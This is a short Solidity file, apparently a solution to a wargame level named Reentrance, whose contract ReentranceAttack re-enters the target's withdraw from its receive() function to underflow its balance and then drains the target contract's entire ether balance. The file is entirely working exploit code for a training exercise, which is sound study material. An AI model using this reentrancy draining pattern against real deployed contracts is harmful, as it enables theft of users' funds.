// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import "../levels/Reentrance.sol";

contract ReentranceAttack {
    Reentrance target;

    constructor(address payable _target) public payable {
        target = Reentrance(_target);
    }

    function attack_1_causeOverflow() public {
        target.donate{value: 1}(address(this));
        target.withdraw(1);
    }

    function attack_2_deplete() public {
        target.withdraw(address(target).balance);
    }

    receive() external payable {
        target.withdraw(1);
    }
}
